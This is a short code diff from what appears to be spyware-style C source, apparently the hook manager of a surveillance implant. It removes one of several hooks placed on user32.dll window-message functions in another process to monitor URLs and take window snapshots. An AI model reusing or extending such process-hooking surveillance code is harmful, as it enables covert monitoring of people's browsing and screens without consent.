@@ -819,7 +819,6 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	// Metto gli Hook per tutti i PM inbundle...
 	// --- PM per Url Monitor
 	HMMAKE_HOOK(dwPid, "SendMessageW", PM_SendMessageURL, SendMessageURLData, PM_SendMessageURL_setup, pServiceData, "user32.dll"); 
-	HMMAKE_HOOK(dwPid, "PostMessageW", PM_PostMessageURL, SendMessageURLData, PM_PostMessageURL_setup, pServiceData, "user32.dll"); 
 	HMMAKE_HOOK(dwPid, "SetWindowTextW", PM_SetWindowText,  SendMessageURLData, PM_SetWindowText_setup,  pServiceData, "user32.dll"); 
 
 	// --- PM per Snapshot (on window creation)
